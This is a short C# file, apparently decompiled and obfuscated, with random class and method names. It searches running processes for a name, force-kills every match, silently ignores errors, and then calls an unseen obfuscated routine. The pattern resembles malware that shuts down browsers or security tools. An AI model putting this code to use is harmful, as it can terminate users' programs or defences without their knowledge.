using System;
using System.Diagnostics;

namespace maXgRZLUwUwi;

public sealed class vSSyKUnTeqWnA
{
	public static bool NzSSmrFSVMr(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void LanZgdjoyWRh(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (NzSSmrFSVMr(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					dVGeYGcQgLS.KNIARyPOBX();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
